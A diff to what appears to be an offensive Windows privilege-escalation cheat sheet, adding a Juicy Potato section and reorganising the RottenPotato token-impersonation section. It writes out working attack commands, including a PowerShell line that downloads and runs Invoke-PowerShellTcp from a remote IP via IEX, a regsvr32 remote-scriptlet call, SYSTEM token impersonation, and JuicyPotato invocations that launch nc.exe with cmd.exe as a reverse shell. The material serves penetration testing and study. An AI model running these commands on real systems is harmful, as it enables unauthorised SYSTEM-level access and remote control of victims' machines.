@@ -17,13 +17,16 @@
 * [EoP - Runas](#eop---runas)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
+* [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
+  * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
-  * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
   * [MS08-067 (NetAPI)](#ms08-067-netapi)
   * [MS10-015 (KiTrap0D)](#ms10-015-kitrap0d---microsoft-windows-nt2000--2003--2008--xp--vista--7)
   * [MS11-080 (adf.sys)](#ms11-080-afd.sys---microsoft-windows-xp-2003)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+* [References](#references)
 
 ## Tools
 
@@ -657,9 +660,9 @@ regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
 Microsoft.Workflow.Compiler.exe tests.xml results.xml
 ```
 
-## EoP - Common Vulnerabilities and Exposure
+## EoP - Impersonation Privileges
 
-### Token Impersonation (RottenPotato)
+### RottenPotato (Token Impersonation)
 
 Binary available at : https://github.com/foxglovesec/RottenPotato
 Binary available at : https://github.com/breenmachine/RottenPotatoNG
@@ -679,6 +682,37 @@ Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
+
+
+### Juicy Potato (abusing the golden privileges)
+
+Binary available at : https://github.com/ohpe/juicy-potato/releases    
+
+1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
+
+    ```powershell
+    whoami /priv
+    ```
+
+2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
+
+    * [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise) 
+    * [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
+    * [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
+    * [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
+    * [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise) 
+    * [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
+    * [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard) 
+
+3. Execute JuicyPotato to run a privileged command.
+
+    ```powershell
+    juicypotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+    juicypotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+    # -l : local listener port
+    ```
+
+## EoP - Common Vulnerabilities and Exposure
 
 ### MS08-067 (NetAPI)
 
